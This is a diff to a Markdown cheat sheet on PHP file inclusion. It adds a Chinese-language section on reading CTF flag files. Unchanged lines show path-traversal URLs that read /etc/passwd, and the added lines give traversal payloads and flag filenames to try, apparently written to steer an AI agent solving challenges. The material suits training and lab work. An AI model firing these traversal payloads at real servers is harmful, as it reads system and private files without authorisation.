@@ -92,6 +92,17 @@ http://example.com/index.php?page=..///////..////..//////etc/passwd
 http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
 ```
 
+### Flag 读取盲区（b-01 实测：不要只试 *.php）
+PHP 的 `include("lang/" . $lang . ".php")` 常带“后缀补齐 + file_exists 门禁”，模型容易只试 .php 而漏掉 flag：
+1. **flag 常是 .txt**（如 `/challenge/flag1.txt`），走 `include("lang/" . $lang)` 的 **fallback（无后缀）分支**——即使有 file_exists 门禁，fallback 分支也能读 .txt。
+2. **路径不带前导斜杠**：`include("lang/" . $lang)` 会拼 `lang/` 前缀，所以 payload 用 `....//....//....//....//challenge/flag1.txt`（`challenge` 前不带 `/`）。
+3. **穿越层数 4 起试**（`....//`×4 一般够到根目录，8 层也兼容）。
+4. 读 flag 一次性试齐（.txt 和 .php 都要，不带前导斜杠）：
+   ```
+   challenge/flag*.txt  challenge/flag1.txt  challenge/flag2.txt
+   flag*.txt  flag.txt  flag  flag.php
+   ```
+
 ## Remote File Inclusion
 
 > Remote File Inclusion (RFI) is a type of vulnerability that occurs when an application includes a remote file, usually through user input, without properly validating or sanitizing the input.
